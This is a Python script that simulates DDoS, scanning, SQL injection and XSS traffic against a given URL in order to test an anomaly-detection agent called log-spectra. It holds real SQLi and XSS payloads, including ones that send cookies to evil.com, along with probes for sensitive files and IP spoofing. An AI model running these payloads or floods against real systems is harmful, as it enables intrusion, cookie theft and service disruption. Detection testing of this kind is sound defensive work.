#!/usr/bin/env python3
"""
Attack Simulator — send HTTP requests directly to the target for testing
agent log-spectra detection (Isolation Forest + behavior rules).

Attack types + detection signals:
  | Attack     | Trigger behavior rules               | Pola request                    |
  |------------|--------------------------------------|---------------------------------|
  | DDoS       | Burst (+35) + Volume (+10)           | request/s >> 5, req >> 500      |
  | Scanning   | Error (+30) + Endpoint (+25)         | banyak 404, unique endpoint >70%|
  | SQLi       | IoC (+60)                            | payload SQL injection di URL    |
  | XSS        | IoC (+60)                            | payload XSS di URL              |
  | Normal     | None (negative control)              | traffic normal, LOW risk        |

Each attack type uses a different source IP (via X-Forwarded-For)
so that per-IP detection on the agent can be verified 1:1.

Usage:
  # Run all attack types
  python test_attack.py https://target.com

  # Run specific attacks only
  python test_attack.py https://target.com --types ddos,sqli

  # Dry-run (printing what would be sent)
  python test_attack.py https://target.com --dry-run

  # Adjust intensity
  python test_attack.py https://target.com --burst 100 --delay 0.05

Requirements: pip install requests
"""

import argparse
import random
import sys
import time
from datetime import datetime

try:
    import requests
    from requests.adapters import HTTPAdapter
except ImportError:
    print("❌ Install requests: pip install requests")
    sys.exit(1)


# ─── Configuration ───────────────────────────────────────────────────────────

# Distinct IP ranges per attack type (via X-Forwarded-For so agent
# sees them as separate source IPs — requires nginx to trust X-Forwarded-For)
DDOS_IPS = [f"10.0.{i}.{random.randint(10, 250)}" for i in range(1, 4)]
SCAN_IPS = [f"10.1.{i}.{random.randint(10, 250)}" for i in range(1, 4)]
SQLI_IPS = [f"10.2.{i}.{random.randint(10, 250)}" for i in range(1, 3)]
XSS_IPS = [f"10.3.{i}.{random.randint(10, 250)}" for i in range(1, 3)]
NORMAL_IPS = [f"192.168.{i}.{random.randint(50, 200)}" for i in range(1, 4)]

# User-Agents — change the browser's default settings to avoid IP scans.
# Suspicious UA rule, so detection is purely behavioral.
UA_BROWSER = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]

# Legitimate endpoints
ENDPOINTS_LEGIT = [
    "/",
    "/about",
    "/contact",
    "/login",
    "/dashboard",
    "/api/health",
    "/products",
    "/blog",
]

# Scanner endpoints — many unique, mostly 404
ENDPOINTS_SCAN = [
    "/admin",
    "/wp-admin",
    "/wp-login.php",
    "/backup.zip",
    "/.env",
    "/.git/config",
    "/phpmyadmin",
    "/config.php",
    "/db_backup.sql",
    "/vendor/phpunit",
    "/shell.php",
    "/wp-content/uploads/shell.php",
    "/api/users",
    "/api/config",
    "/api/backup",
    "/debug",
    "/server-status",
    "/info.php",
    "/test.php",
    "/xmlrpc.php",
    "/api/v1/users",
    "/api/v1/admin",
    "/console",
    "/manager/html",
    "/actuator",
    "/swagger-ui",
    "/api-docs",
    "/graphql",
    "/wp-json/wp/v2/users",
    "/.well-known/security.txt",
    "/api/private",
    "/internal",
    "/config.json",
    "/dump.sql",
    "/phpinfo.php",
    "/logs",
    "/error.log",
    "/access.log",
]

# SQLi payloads — trigger has_ioc → IoC rule (+60)
SQLI_PAYLOADS = [
    "/api/login?user=admin' or '1'='1",
    "/api/login?user=admin'--&pass=any",
    "/api/search?q=1' union select 1,2,3,4--",
    "/api/products?id=1 union all select * from users",
    "/api/user?uid=1 and 1=1",
    "/api/search?q=test' or sleep(5)--",
    "/api/data?id=1'/**/or/**/1=1",
    '/api/admin?user=admin" or "1"="1',
    "/api/view?id=1' order by 10--",
    "/api/fetch?id=1 union select group_concat(table_name),2 from information_schema.tables",
    "/api/items?id=1' and 1=2 union select 1,@@version,3,4",
    "/api/filter?cat=1' or '1'='1' --",
    "/api/profile?uid=benchmark(1000000,md5('test'))",
    "/api/get?q=1' and extractvalue(1,concat(0x7e,(select database())))--",
    "/api/export?file=data.csv' union select 1,2,3 into outfile '/tmp/evil.txt'--",
]

# XSS payloads — trigger has_ioc → IoC rule (+60)
XSS_PAYLOADS = [
    "/api/search?q=<script>alert('xss')</script>",
    "/api/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "/api/profile?name=<img src=x onerror=alert(1)>",
    "/api/comment?text=<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "/api/feedback?msg=<svg onload=alert(1)>",
    "/api/redirect?url=javascript:alert(1)",
    "/api/post?title=<body onload=alert(1)>",
    "/api/search?q=%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
    "/api/comment?text=<img src=x onerror=fetch('http://evil.com/steal?c='+document.cookie)>",
    "/api/profile?bio=<details open ontoggle=alert(1)>",
    "/api/settings?lang=</script><script>alert(1)</script>",
    "/api/report?url=data:text/html,<script>alert(1)</script>",
    '/api/search?q=" onmouseover="alert(1)"',
    "/api/view?page=<iframe src=javascript:alert(1)>",
    "/api/comment?text=[[{{constructor.constructor('alert(1)')()}}]]",
]


# ─── HTTP Session ────────────────────────────────────────────────────────────


def make_session(timeout: int = 10) -> requests.Session:
    session = requests.Session()
    adapter = HTTPAdapter(pool_connections=20, pool_maxsize=100)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.verify = False
    session.timeout = timeout
    return session


def send(
    session: requests.Session,
    url: str,
    ip: str,
    ua: str,
    dry_run: bool = False,
    delay: float = 0,
) -> int | None:
    """Send one GET request, return status code."""
    if dry_run:
        print(f"  [{ip}] GET {url}")
        return None
    if delay > 0:
        time.sleep(delay)

    headers = {
        "User-Agent": ua,
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
    }
    try:
        resp = session.get(url, headers=headers, timeout=10)
        return resp.status_code
    except requests.exceptions.Timeout:
        return None
    except Exception as e:
        # Timeout saat DDoS — skip, itu wajar
        return None


# ─── Attack runners ──────────────────────────────────────────────────────────


def run_ddos(
    target: str,
    session: requests.Session,
    *,
    dry_run: bool = False,
    burst_size: int = 80,
    inter_request_delay: float = 0.0,
) -> int:
    """
    DDoS: high-frequency to the same endpoint of DDOS_IPS.
    Expected → Burst (+35) + Volume (+10).
    """
    total = 0
    for ip in DDOS_IPS:
        for _ in range(3):  # 3 bursts per IP
            for _ in range(burst_size):
                status = send(
                    session,
                    target,
                    ip,
                    random.choice(UA_BROWSER),
                    dry_run,
                    inter_request_delay,
                )
                total += 1
            if not dry_run:
                time.sleep(0.5)
    return total


def run_scanning(
    target: str,
    session: requests.Session,
    *,
    dry_run: bool = False,
    inter_request_delay: float = 0.05,
) -> int:
    """
    Scanning: each SCAN_IP hits 38+ unique endpoints, mostly 404.
    Expected → Error (+30) + Endpoint (+25).
    """
    total = 0
    for ip in SCAN_IPS:
        endpoints = list(ENDPOINTS_SCAN)
        random.shuffle(endpoints)
        for ep in endpoints:
            url = target.rstrip("/") + ep
            status = send(
                session,
                url,
                ip,
                random.choice(UA_BROWSER),
                dry_run,
                inter_request_delay,
            )
            total += 1
        if not dry_run:
            time.sleep(1)
    return total


def run_sqli(
    target: str,
    session: requests.Session,
    *,
    dry_run: bool = False,
    inter_request_delay: float = 0.1,
) -> int:
    """
    SQL injection: payload SQL pattern in the URL.
    Expected → has_ioc=True → IoC (+60) → HIGH.
    """
    total = 0
    for ip in SQLI_IPS:
        payloads = list(SQLI_PAYLOADS)
        random.shuffle(payloads)
        for p in payloads:
            url = target.rstrip("/") + p
            status = send(
                session,
                url,
                ip,
                random.choice(UA_BROWSER),
                dry_run,
                inter_request_delay,
            )
            total += 1
        if not dry_run:
            time.sleep(0.5)
    return total


def run_xss(
    target: str,
    session: requests.Session,
    *,
    dry_run: bool = False,
    inter_request_delay: float = 0.1,
) -> int:
    """
    XSS: payload XSS pattern in the URL.
    Expected → has_ioc=True → IoC (+60) → HIGH.
    """
    total = 0
    for ip in XSS_IPS:
        payloads = list(XSS_PAYLOADS)
        random.shuffle(payloads)
        for p in payloads:
            url = target.rstrip("/") + p
            status = send(
                session,
                url,
                ip,
                random.choice(UA_BROWSER),
                dry_run,
                inter_request_delay,
            )
            total += 1
        if not dry_run:
            time.sleep(0.5)
    return total


def run_normal(
    target: str,
    session: requests.Session,
    *,
    dry_run: bool = False,
    inter_request_delay: float = 0.5,
) -> int:
    """
    Normal browsing — negative control.
    Expected → LOW risk (<40), no behavior rules trigger.
    """
    total = 0
    for ip in NORMAL_IPS:
        for _ in range(20):
            ep = random.choice(ENDPOINTS_LEGIT)
            url = target.rstrip("/") + ep
            status = send(
                session,
                url,
                ip,
                random.choice(UA_BROWSER),
                dry_run,
                inter_request_delay,
            )
            total += 1
        if not dry_run:
            time.sleep(1)
    return total


# ─── Main ────────────────────────────────────────────────────────────────────

ATTACK_RUNNERS = {
    "ddos": run_ddos,
    "scanning": run_scanning,
    "sqli": run_sqli,
    "xss": run_xss,
    "normal": run_normal,
}


def main():
    parser = argparse.ArgumentParser(
        description="Attack Simulator — test agent detection log-spectra"
    )
    parser.add_argument("target", help="Target URL (e.g. https://example.com)")
    parser.add_argument(
        "--types",
        default=None,
        help="Comma-separated: ddos,scanning,sqli,xss,normal (default: all)",
    )
    parser.add_argument(
        "--dry-run", action="store_true", help="Only print requests, don't send"
    )
    parser.add_argument(
        "--burst",
        type=int,
        default=80,
        help="DDoS burst size per IP per wave (default: 80)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Inter-request delay in seconds (default: 0 — no delay)",
    )
    parser.add_argument(
        "--timeout", type=int, default=10, help="Request timeout seconds (default: 10)"
    )

    args = parser.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith("http"):
        target = "https://" + target

    attack_types = args.types.split(",") if args.types else list(ATTACK_RUNNERS.keys())

    session = make_session(args.timeout) if not args.dry_run else None

    now = datetime.now().strftime("%H:%M:%S")
    print(f"╔══════════════════════════════════════════════╗")
    print(f"║     Attack Simulator — log-spectra test       ║")
    print(f"╠══════════════════════════════════════════════╣")
    print(f"║  Target  : {target:38} ║")
    print(f"║  Time    : {now:38} ║")
    print(f"║  Mode    : {'DRY-RUN' if args.dry_run else 'LIVE':38} ║")
    print(f"╚══════════════════════════════════════════════╝")
    print()

    total_requests = 0
    results: dict[str, int] = {}

    for atype in attack_types:
        atype = atype.strip().lower()
        runner = ATTACK_RUNNERS.get(atype)
        if runner is None:
            print(f"  ⚠ Unknown attack type: {atype} (skip)")
            continue

        label = atype.upper()
        print(f"── {label} {'─' * (52 - len(label))}")

        extra = {}
        if atype == "ddos":
            extra["burst_size"] = args.burst

        n = runner(
            target,
            session,
            dry_run=args.dry_run,
            inter_request_delay=args.delay,
            **extra,
        )
        results[atype] = n
        total_requests += n
        print(f"  ✓ {atype}: {n} requests sent\n")

    # Summary
    print("═══ SUMMARY ═══════════════════════════════════")
    print(f"  Total requests : {total_requests}")
    for atype, n in results.items():
        print(f"  {atype:12} → {n:4} req")
    print()

    # Detection expectation
    print("═══ DETECTION EXPECTATION ════════════════════")
    print(f"  {'Attack':10} {'Source IP':30} {'Expected Risk'}")
    print(f"  {'─'*10} {'─'*30} {'─'*30}")

    expected = {
        "ddos": ("Burst (+35) + Volume (+10)", "MEDIUM-HIGH (≥40)"),
        "scanning": ("Error (+30) + Endpoint (+25)", "MEDIUM-HIGH (≥55)"),
        "sqli": ("IoC (+60)", "HIGH (≥70)"),
        "xss": ("IoC (+60)", "HIGH (≥70)"),
        "normal": ("None", "LOW (<40)"),
    }
    ips_map = {
        "ddos": DDOS_IPS,
        "scanning": SCAN_IPS,
        "sqli": SQLI_IPS,
        "xss": XSS_IPS,
        "normal": NORMAL_IPS,
    }

    for atype in attack_types:
        if atype not in expected:
            continue
        rules, risk = expected[atype]
        ips = ", ".join(ips_map.get(atype, []))
        print(f"  {atype:10} {ips:30} {risk}")

    print()
    print("  Check dashboard / agent log for detection validation.")
    print()


if __name__ == "__main__":
    main()
